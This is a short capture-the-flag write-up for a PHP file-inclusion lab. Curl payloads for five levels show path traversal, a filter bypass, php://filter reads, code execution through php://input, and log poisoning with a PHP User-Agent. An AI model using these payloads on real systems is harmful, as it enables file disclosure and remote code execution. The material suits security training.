# File Handling Lab - Writeup
## Port: 8061 | Kategori: File Inclusion

## Level 1: Basic Path Traversal
curl "http://target:8061/?level=1&file=../../../var/flags/flag1.txt"

## Level 2: Filter Bypass
curl "http://target:8061/?level=2&file=....//....//....//var/flags/flag2.txt"

## Level 3: PHP Wrappers
curl "http://target:8061/?level=3&file=php://filter/convert.base64-encode/resource=/var/flags/flag3.txt"

## Level 4: RFI
curl -X POST "http://target:8061/?level=4&file=php://input" -d '<?php system("cat /var/flags/flag4.txt"); ?>'

## Level 5: Log Poisoning
curl -A '<?php system("cat /var/flags/flag5.txt"); ?>' http://target:8061/
curl "http://target:8061/?level=5&file=/var/log/apache2/access.log"
